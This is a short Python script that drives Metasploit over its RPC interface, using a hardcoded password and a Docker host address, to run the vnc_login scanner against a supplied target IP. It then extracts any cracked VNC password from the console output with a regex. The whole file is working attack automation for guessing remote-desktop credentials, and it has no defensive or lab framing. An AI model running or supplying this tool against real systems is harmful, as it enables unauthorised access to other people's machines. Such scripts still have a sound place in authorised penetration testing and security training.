import asyncio
import logging
import re
import pexpect
from pymetasploit3.msfrpc import MsfRpcClient

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

async def run_vnc_login_console(target_ip):
    try:
        logger.info("Connecting to Metasploit RPC...")
        # Connect to msfrpcd with Docker host IP and port
        client = MsfRpcClient(password='mypass', server='172.17.0.1', port=55553, ssl=False)

        logger.info("Creating new Metasploit console...")
        console = client.consoles.console()

        logger.info("Sending commands to Metasploit...")
        console.write("use auxiliary/scanner/vnc/vnc_login\n")
        await asyncio.sleep(1)
        console.write(f"set RHOSTS {target_ip}\n")
        await asyncio.sleep(1)
        console.write("run\n")
        await asyncio.sleep(10)  # Wait for the scan to complete

        output = console.read()['data']

        # Try to find the password in the output using regex
        match = re.search(r'Login Successful: ?:?(\S+)', output)
        if match:
            password = match.group(1)
            logger.info(f"Found password: {password}")
            return password
        else:
            logger.info("No successful login found.")
            return None

    except Exception as e:
        logger.error(f"Error occurred: {e}")
        return None




